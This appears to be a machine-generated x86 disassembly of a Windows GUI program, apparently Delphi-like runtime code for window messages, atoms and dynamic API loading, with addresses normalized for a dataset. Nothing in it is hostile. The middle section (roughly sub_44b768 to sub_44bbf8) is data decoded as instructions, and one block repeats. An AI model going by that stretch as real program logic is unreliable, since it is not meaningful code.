mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4464d0
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_440358
jmp r-xdata
sub_44ac70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032b8
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_44ade4
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_44ad00
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44adbc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_44ad64
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_44ad94
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406de0
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_44adbc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ad30
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_44ade4
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_44ad48
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_44ad64
pop ebx
retn
mov eax ebx
call sub_44ad94
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_44ae48
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44afae
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_44b0cc
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_44b0b0
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_44b0b0
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_44b1bc
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4032e8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4032e8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_4032e8
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_4032e8
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404038
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404038
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_44b244
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44b3bc
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408f18
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_40408c
mov eax [ rw-data ]
call sub_4044f8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408f18
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_40408c
mov eax [ rw-data ]
call sub_4044f8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_4044f8
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_417784
mov [ rw-data ] eax
call sub_44ae48
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ac70
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45d1ec
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e2d0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_45feb8
mov ecx r-xdata
mov edx sub_43cdc0
mov eax [ r-xdata ]
call sub_416f38
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b3c3
lea eax [ ebp - 0x10 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_44b42c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44b48b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b492
retn
mov eax rw-data
call sub_40d18c
call sub_44b1bc
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404ac0
mov eax rw-data
call sub_404038
mov eax rw-data
call sub_404038
sub_44b494
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44b51a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b521
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_44b244
mov eax [ r-xdata ]
call sub_416dac
mov eax [ r-xdata ]
call sub_416e4c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
sub_44b768
stc
push ebx
push eax
call [ edi + edi * 4 ]
inc esp
add [ edi + edi * 4 + 0x44 ] bl
add [ eax - 0x3f ] ah
inc esp
add [ eax + 0x110044c1 ] al
push esp
inc ebx
jne r-xdata
inc eax
je r-xdata
push eax
mov eax 0xb070044
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
add [ eax ] dl
aam 0x41
inc esp
xor eax 0x35380040
inc eax
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
les edi [ esi + 0x7bf80044 ]
inc ecx
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
mov dh 0x44
add [ eax ] bl
add bh bh
mov al [ 0x10044c1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
test [ gs : ecx + eax * 2 ] cl
inc eax
add [ eax ] al
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
dec eax
mov dh 0x44
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
nop
mov bh 0x44
add [ eax ] cl
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xcba40006
inc esp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
outsd
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
add al ch
mov edi 0xd4f80044
inc ecx
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
pop eax
mov esi 0xc06c0044
inc esp
add [ eax + 0xb0044bf ] ch
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 4 ] ch
inc esp
add [ eax ] dh
add [ eax ] al
add [ esi + edx * 2 ] ah
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x736bffc0 ] bl
inc ecx
add al bh
jpo r-xdata
arpl [ ebp + 0x74 ] si
test [ gs : ecx + eax * 2 ] cl
pushad
add [ eax ] al
jmp [ eax ]
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
cmp [ edi + 0x41 ] bl
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xb8080000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x48 ] dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x48 ] al
inc esp
add [ eax ] ch
add [ eax ] al
loopne r-xdata
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x413bffc0 ] bl
inc esp
add al bh
jpo r-xdata
inc esp
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
cwde
lea eax [ ecx ]
fmul [ ebp - 0x71bbffbf ]
inc ecx
add al al
add [ ecx ] 0xd4
pop [ ecx ]
push esp
test [ ecx ] eax
sub [ esi - 0x6fefffbf ] al
inc ecx
add [ eax ] ah
nop
add [ eax ] dh
add [ ecx ] 0x28
jg r-xdata
add [ edi + ecx * 4 + 0x41 ] dh
add [ eax - 0x71 ] bh
inc ecx
add [ ebx + eax * 4 ] dl
inc ecx
add ah ch
nop
inc ecx
add [ eax - 0x6f ] cl
inc ecx
add [ edx + edx * 4 ] bl
inc ecx
add [ eax - 0x76 ] ah
inc ecx
add [ eax - 0x6e ] bl
inc ecx
add ah cl
xchg edx eax
inc ecx
add [ eax - 0x3ffbb37 ] dh
mov [ ecx ] es
jo r-xdata
inc ecx
add [ eax + edx * 4 + 0x41 ] dh
add ah al
mov es [ ecx ]
test [ edx - 0x6d6bffbf ] dl
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
inc ecx
add [ esi + eax * 4 - 0x791fffbf ] cl
inc ecx
add [ edi + eax * 4 - 0x76dbffbf ] cl
inc ecx
add [ ecx + ecx * 4 + 0x41 ] bh
add [ eax ] dl
mov al [ ecx ]
pushad
lea eax [ ecx ]
jl r-xdata
inc esp
mov es [ ecx ]
rol [ edx - 0x702bffbf ] 0x41
add [ ebp + eax * 4 + 0x41 ] dl
add [ eax ] ch
xchg [ ecx ] al
adc [ eax - 0x6fdfffbf ] dl
add [ edi + ecx * 4 ] bh
inc ecx
add [ eax - 0x71 ] dh
inc ecx
push edi
inc ecx
add [ eax - 0x27ffbe73 ] bl
lea eax [ ecx ]
add [ edx + esi - 0x3c73ffc0 ] bl
inc esp
add ah bl
retn
inc ebx
jne r-xdata
inc eax
add [ ebx + eax * 8 - 0x3c23ffbc ] cl
inc esp
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
dec esp
imul esi [ ebx + 0x74 ] 0xba40c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ eax ] al
in al 0x10
inc eax
add [ eax + eax ] bh
add [ edx ] al
add dh ch
inc esp
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
cmp bl al
inc esp
add [ ebx + ebx * 8 ] al
inc ecx
add [ eax + 0x3c0041da ] ch
fiadd [ ecx ]
insb
fiadd [ ecx ]
inc eax
fiadd [ ecx ]
add [ esi - 0x392fffbc ] bh
inc esp
add [ eax - 0x3a ] ch
inc esp
add [ ecx + ecx * 8 + 0xe0044 ] ah
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
in al 0x10
inc eax
add [ eax + eax ] ah
add ah ah
adc [ eax ] al
js r-xdata
call 0x4444fc95
fiadd [ ecx ]
lodsb [ esi ]
mov esp 0xc8a80044
inc ebx
jne r-xdata
add [ edx + ebx * 8 + 0x41 ] al
add [ esp + edi * 4 - 0x3757ffbc ] ch
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xbab00000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 4 ] al
inc esp
add [ eax - 0x45 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
mov ebx 0xbb340044
inc esp
add [ eax + 0x24000000 ] ah
mov ch 0x44
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
dec esp
imul esi [ ebx + 0x74 ] r-xdata
adc al 0x57
sub_44b94c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
mov edx 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xba
inc esp
add [ eax ] dh
add [ eax ] al
add [ esi + edx * 2 ] ah
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x736bffc0 ] bl
inc ecx
add al bh
jpo r-xdata
cwde
lea eax [ ecx ]
fmul [ ebp - 0x71bbffbf ]
inc ecx
add al al
add [ ecx ] 0xd4
pop [ ecx ]
push esp
test [ ecx ] eax
sub [ esi - 0x6fefffbf ] al
inc ecx
add [ eax ] ah
nop
add [ eax ] dh
add [ ecx ] 0x28
jg r-xdata
add [ edi + ecx * 4 + 0x41 ] dh
add [ eax - 0x71 ] bh
inc ecx
add [ ebx + eax * 4 ] dl
inc ecx
add ah ch
nop
inc ecx
add [ eax - 0x6f ] cl
inc ecx
add [ edx + edx * 4 ] bl
inc ecx
add [ eax - 0x76 ] ah
inc ecx
add [ eax - 0x6e ] bl
inc ecx
add ah cl
xchg edx eax
inc ecx
add [ eax - 0x3ffbb37 ] dh
mov [ ecx ] es
jo r-xdata
inc ecx
add [ eax + edx * 4 + 0x41 ] dh
add ah al
mov es [ ecx ]
test [ edx - 0x6d6bffbf ] dl
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
inc ecx
add [ esi + eax * 4 - 0x791fffbf ] cl
inc ecx
add [ edi + eax * 4 - 0x76dbffbf ] cl
inc ecx
add [ ecx + ecx * 4 + 0x41 ] bh
add [ eax ] dl
mov al [ ecx ]
pushad
lea eax [ ecx ]
jl r-xdata
inc esp
mov es [ ecx ]
rol [ edx - 0x702bffbf ] 0x41
add [ ebp + eax * 4 + 0x41 ] dl
add [ eax ] ch
xchg [ ecx ] al
adc [ eax - 0x6fdfffbf ] dl
add [ edi + ecx * 4 ] bh
inc ecx
add [ eax - 0x71 ] dh
inc ecx
push edi
inc ecx
add [ eax - 0x27ffbe73 ] bl
lea eax [ ecx ]
add [ edx + esi - 0x3c73ffc0 ] bl
inc esp
add ah bl
retn
inc ebx
jne r-xdata
inc eax
add [ ebx + eax * 8 - 0x3c23ffbc ] cl
inc esp
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
dec esp
imul esi [ ebx + 0x74 ] 0xba40c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ eax ] al
in al 0x10
inc eax
add [ eax + eax ] bh
add [ edx ] al
add dh ch
inc esp
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
cmp bl al
inc esp
add [ ebx + ebx * 8 ] al
inc ecx
add [ eax + 0x3c0041da ] ch
fiadd [ ecx ]
insb
fiadd [ ecx ]
inc eax
fiadd [ ecx ]
add [ esi - 0x392fffbc ] bh
inc esp
add [ eax - 0x3a ] ch
inc esp
add [ ecx + ecx * 8 + 0xe0044 ] ah
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
in al 0x10
inc eax
add [ eax + eax ] ah
add ah ah
adc [ eax ] al
js r-xdata
call 0x4444fc95
fiadd [ ecx ]
lodsb [ esi ]
mov esp 0xc8a80044
inc ebx
jne r-xdata
add [ edx + ebx * 8 + 0x41 ] al
add [ esp + edi * 4 - 0x3757ffbc ] ch
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xbab00000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 4 ] al
inc esp
add [ eax - 0x45 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
mov ebx 0xbb340044
inc esp
add [ eax + 0x24000000 ] ah
mov ch 0x44
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
dec esp
imul esi [ ebx + 0x74 ] r-xdata
adc al 0x57
sub_44bbf8
loopne r-xdata
sub cl bl
inc ecx
add [ eax + 0x5c0041d9 ] cl
fld [ ecx ]
mov ecx ds
inc ecx
add [ eax + ebx * 8 - 0x26bfffbf ] ch
inc ecx
add [ ecx + ebx * 8 - 0x3dbfffbf ] dl
inc esp
add [ edx + eax * 8 + 0x44 ] dl
add [ eax - 0x3e ] ch
inc esp
add [ edx + eax * 8 + 0x44 ] bh
add [ eax - 0x5bffbb3e ] dl
retn 0x44
inc esp
add ah dh
retn 0x44
sub_44bc3c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d9e4
test bl bl
jle r-xdata
mov edx esi
call sub_44c050
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_44bcac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41d4f8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_44bd54
sub_44bce0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44bc70
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_417460
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_4175ec
sub_44bd28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_404444
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_40408c
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44bd54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44c050
mov edx ebx
mov eax esi
call sub_44c030
sub_44bd7c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44bd54
sub_44bda8
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_460c84
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_4034e4
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41da70
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_43cbec
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44be00
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_460cac
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_4034e4
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41da8c
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_43cbec
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44be58
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41d098
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44bfdc
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_44bec4
push ebx
push esi
push edi
call sub_403674
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_4032e8
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_417658
call sub_4032e8
mov eax [ edi + 0x30 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41d0e4
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
sub_44bf14
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44bf5c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4175cc
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403498
mov edx edi
call sub_44bce0
sub_44bfa8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_44d84c
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_44d890
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_41d168
sub_44bfe8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41d3b4
cmp bl 0x1
jne r-xdata
pop edi
